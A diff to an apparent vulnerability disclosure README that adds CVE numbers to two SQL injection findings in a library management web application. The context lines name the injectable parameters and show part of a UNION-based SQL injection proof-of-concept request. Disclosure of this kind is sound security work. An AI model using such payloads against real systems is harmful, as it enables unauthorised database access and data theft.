@@ -7,7 +7,7 @@
 ### Tested on: windows10 + phpstudy
 
 
-# 1./admin/lab.php
+# 1./admin/lab.php(CVE-2022-2491)
 /lab.php SQL injection exists for parameter Section
 
 ### Sample request POC #1
@@ -34,7 +34,7 @@ submit=1&Section=1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71716b717
 ![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/16583071067058.png "Library Management System with QR code Attendance and Auto Generate Library Card")
 
 
-# 2./index.php
+# 2./index.php(CVE-2022-2492)
 /index.php SQL injection exists for parameter RollNo
 
 ### Sample request POC #2
